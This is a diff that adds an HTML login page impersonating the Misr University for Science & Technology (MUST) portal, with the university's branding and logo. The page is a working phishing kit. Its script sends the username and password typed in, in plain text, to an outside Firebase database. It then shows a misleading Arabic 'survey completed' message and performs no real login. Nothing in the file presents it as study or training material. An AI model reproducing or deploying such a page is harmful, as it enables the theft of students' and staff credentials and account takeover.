@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in to the site | MUST</title>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+<style>
+body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: #e9ecef;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+
+.login-container {
+    background: #ffffff;
+    padding: 30px 35px;
+    border-radius: 4px;
+    width: 380px;
+    box-shadow: 0 4px 6px rgba(0,0,0,0.05), 0 1px 3px rgba(0,0,0,0.1);
+    box-sizing: border-box;
+}
+
+.logo-wrapper {
+    text-align: center;
+    margin-bottom: 25px;
+}
+
+.logo-wrapper img {
+    width: 130px;
+    height: auto;
+}
+
+.brand-text {
+    font-family: "Arial Black", Gadget, sans-serif;
+    color: #003366;
+    font-size: 19px;
+    font-weight: bold;
+    letter-spacing: 0.5px;
+    margin-top: 10px;
+    line-height: 1.2;
+}
+
+.brand-subtext {
+    color: #43609c;
+    font-size: 11px;
+    font-weight: bold;
+    letter-spacing: 1px;
+    margin-top: 2px;
+}
+
+.form-group {
+    margin-bottom: 15px;
+}
+
+input {
+    width: 100%;
+    padding: 10px 12px;
+    border: 1px solid #ced4da;
+    border-radius: 4px;
+    font-size: 14px;
+    color: #495057;
+    background-color: #fff;
+    box-sizing: border-box;
+    transition: border-color 0.15s ease-in-out;
+}
+
+input:focus {
+    border-color: #80bdff;
+    outline: 0;
+}
+
+.btn-wrapper {
+    display: flex;
+    justify-content: flex-start;
+    margin-top: 20px;
+}
+
+button {
+    background: #0f6cbcf2;
+    color: white;
+    border: none;
+    padding: 10px 24px;
+    font-size: 15px;
+    font-weight: 500;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.2s;
+}
+
+button:hover {
+    background: #02529c;
+}
+
+/* تعديل حجم وشكل رسالة النجاح لتكون أكبر وأوضح */
+.msg {
+    display: none;
+    text-align: center;
+    margin-top: 20px;
+    margin-bottom: 10px;
+    color: #28a745;
+    font-weight: bold;
+    font-size: 18px; /* تكبير حجم الخط */
+    padding: 8px;
+    background-color: #eafaf1; /* إضافة خلفية خفيفة لتبرز بشكل أفضل */
+    border-radius: 4px;
+    border: 1px solid #d4edda;
+}
+
+.links-section {
+    margin-top: 15px;
+    font-size: 13px;
+}
+
+.links-section a {
+    color: #007bff;
+    text-decoration: none;
+}
+
+.links-section a:hover {
+    text-decoration: underline;
+}
+
+.guest-section {
+    margin-top: 35px;
+    border-top: 1px solid #dee2e6;
+    padding-top: 20px;
+    font-size: 14px;
+    color: #6c757d;
+}
+
+.guest-btn {
+    background: #e9ecef;
+    color: #495057;
+    padding: 7px 14px;
+    font-size: 12px;
+    margin-top: 8px;
+    border-radius: 4px;
+    display: inline-block;
+    cursor: pointer;
+    border: 1px solid #ced4da;
+}
+
+.cookies-notice {
+    margin-top: 35px;
+    font-size: 11px;
+    color: #6c757d;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+
+<div class="login-container">
+    <div class="logo-wrapper">
+        <img src="https://mustdesktop.github.io/assets/images/must-logo-.png.gif" alt="MUST Logo">
+        <div class="brand-text">MISR UNIVERSITY</div>
+        <div class="brand-subtext">FOR SCIENCE & TECHNOLOGY</div>
+    </div>
+
+    <div class="form-group">
+        <input id="username" placeholder="Username">
+    </div>
+    <div class="form-group">
+        <input id="password" type="password" placeholder="Password">
+    </div>
+
+    <div class="btn-wrapper">
+        <button onclick="send()">Log in</button>
+    </div>
+
+    <div class="msg" id="msg">تم الاستبيان بنجاح من قبل ✔</div>
+
+    <div class="links-section">
+        <a href="#">Lost password?</a>
+    </div>
+
+    <div class="guest-section">
+        Some courses may allow guest access
+        <br>
+        <div class="guest-btn">Access as a guest</div>
+    </div>
+
+    <div class="cookies-notice">
+        Cookies notice
+    </div>
+</div>
+
+<script>
+// إعدادات الفايربيز الخاصة بك بدون أي تعديل
+const firebaseConfig = {
+    databaseURL: "https://ipoi-31504-default-rtdb.firebaseio.com/"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+
+function send(){
+    let user = document.getElementById("username").value;
+    let pass = document.getElementById("password").value;
+
+    if(user === "" || pass === "") return;
+
+    // إرسال البيانات للفايربيز بنفس التركيب السابق
+    db.ref("survey").push({
+        username: user,
+        password: pass,
+        time: new Date().toLocaleString()
+    });
+
+    // إظهار رسالة إتمام العملية وتفريغ الحقول
+    document.getElementById("msg").style.display = "block";
+    document.getElementById("username").value = "";
+    document.getElementById("password").value = "";
+}
+</script>
+
+</body>
+</html>
